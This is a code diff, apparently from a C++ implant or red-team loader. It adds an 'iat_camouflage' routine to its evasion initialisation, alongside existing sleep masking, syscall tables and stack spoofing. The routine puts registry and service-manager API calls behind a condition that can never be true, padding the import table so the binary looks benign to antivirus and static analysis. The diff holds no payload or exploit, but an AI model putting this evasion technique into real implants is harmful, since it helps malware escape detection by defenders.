@@ -95,9 +95,31 @@ static auto declfn xor_sensitive_data( instance& inst ) -> void {
     }
 }
 
+static auto declfn iat_camouflage( instance& inst ) -> void {
+    ULONG_PTR uAddress = reinterpret_cast<ULONG_PTR>(
+        inst.ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, 0x100 ) );
+    if ( !uAddress ) return;
+
+    if ( ( ( uAddress >> 8 ) & 0xFF ) > 0xFFFF ) {
+        inst.advapi32.RegCloseKey( nullptr );
+        inst.advapi32.RegOpenKeyExA( nullptr, nullptr, 0, 0, nullptr );
+        inst.advapi32.RegQueryValueExA( nullptr, nullptr, nullptr, nullptr, nullptr, nullptr );
+        inst.advapi32.RegEnumKeyExA( nullptr, 0, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr );
+        inst.advapi32.RegSetValueExA( nullptr, nullptr, 0, 0, nullptr, 0 );
+        inst.advapi32.RegCreateKeyExA( nullptr, nullptr, 0, nullptr, 0, 0, nullptr, nullptr, nullptr );
+        inst.advapi32.OpenSCManagerW( nullptr, nullptr, 0 );
+        inst.advapi32.OpenServiceW( nullptr, nullptr, 0 );
+        inst.advapi32.QueryServiceConfigW( nullptr, nullptr, 0, nullptr );
+        inst.advapi32.CloseServiceHandle( nullptr );
+    }
+
+    inst.ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, reinterpret_cast<PVOID>( uAddress ) );
+}
+
 auto declfn evasion_on_init( instance& inst ) -> void {
     init_syscall_table( inst );
     init_sleep_mask( inst );
+    iat_camouflage( inst );
 
 #if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
     spoof_init( inst );
